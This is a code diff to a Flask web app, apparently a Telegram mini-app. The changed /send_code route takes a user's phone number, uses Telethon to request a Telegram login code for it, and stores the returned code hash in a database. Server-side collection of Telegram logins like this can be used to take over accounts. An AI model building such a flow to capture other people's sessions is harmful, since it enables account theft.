@@ -43,22 +43,28 @@ def miniapp():
 # =====================
 # SEND CODE
 # =====================
+from telethon.sessions import StringSession
+
 @app.route("/send_code", methods=["POST"])
 def send_code():
-    data = request.json
-    phone = data.get("phone")
+    phone = request.json.get("phone")
 
     if not phone:
         return jsonify({"status": "error", "message": "Telefon raqam yo‘q"})
 
+    async def _send():
+        client = TelegramClient(StringSession(), API_ID, API_HASH)
+        await client.connect()
+
+        sent = await client.send_code_request(phone)
+
+        await client.disconnect()
+        return sent.phone_code_hash   # 🔥 MANA TO‘G‘RISI
+
     try:
-        # ❗ async emas — oddiy sync ishlatamiz
-        client = TelegramClient("login_sender", API_ID, API_HASH)
-        client.connect()
+        phone_code_hash = asyncio.run(_send())
 
-        sent = client.send_code_request(phone)
-
-        # DB ga yozamiz (created_at avtomatik)
+        # 🔐 HASH NI DB GA YOZAMIZ
         conn = get_db()
         cur = conn.cursor()
         cur.execute("""
@@ -68,16 +74,14 @@ def send_code():
             DO UPDATE SET
                 phone_code_hash = EXCLUDED.phone_code_hash,
                 created_at = NOW()
-        """, (phone, sent.phone_code_hash))
+        """, (phone, phone_code_hash))
         conn.commit()
         conn.close()
-
-        client.disconnect()
 
         return jsonify({"status": "ok"})
 
     except Exception as e:
-        print("SEND_CODE ERROR:", e)
+        print("SEND_CODE ERROR:", repr(e))
         return jsonify({"status": "error", "message": str(e)})
 
 # =====================
